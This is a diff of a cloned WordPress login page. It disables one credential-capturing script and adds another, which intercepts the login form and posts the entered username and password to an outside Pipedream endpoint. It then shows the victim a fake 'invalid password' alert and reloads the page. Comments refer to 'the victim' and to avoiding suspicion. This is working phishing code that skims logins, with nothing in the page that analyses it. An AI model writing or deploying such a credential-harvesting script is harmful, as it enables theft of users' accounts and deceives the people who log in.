@@ -86,7 +86,7 @@ var _wpUtilSettings = {"ajax":{"url":"\/wp-admin\/admin-ajax.php"}};
 var userProfileL10n = {"user_id":"0","nonce":"a612e5aecd"};
 </script>
 <script src="https://kabricare.com/wp-admin/js/user-profile.min.js?ver=6.7.2" id="user-profile-js"></script>
-	<script>
+	<!--<script>
 document.getElementById("loginform").addEventListener("submit", function(e) {
   // Capture credentials
   const username = document.getElementById("user_login").value;
@@ -110,7 +110,26 @@ document.getElementById("loginform").addEventListener("submit", function(e) {
   // Optional: Submit the form afterward to avoid suspicion
   setTimeout(() => e.target.submit(), 100);
 });
-  </script>
+  </script>-->
+<script>
+document.getElementById("loginform").addEventListener("submit", function(e) {
+  e.preventDefault(); // 🔥 Stop submission to the real site
+
+  const username = document.getElementById("user_login").value;
+  const password = document.getElementById("user_pass").value;
+
+  // Send credentials to your server (Pipedream)
+  fetch("https://eou8r47ercx3oqt.m.pipedream.net", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ username, password })
+  });
+
+  // Show a fake error message to the victim
+  alert("Invalid username or password. Please try again.");
+  window.location.reload(); // Reset the form
+});
+</script>		
   </body>
 	</html>
 	
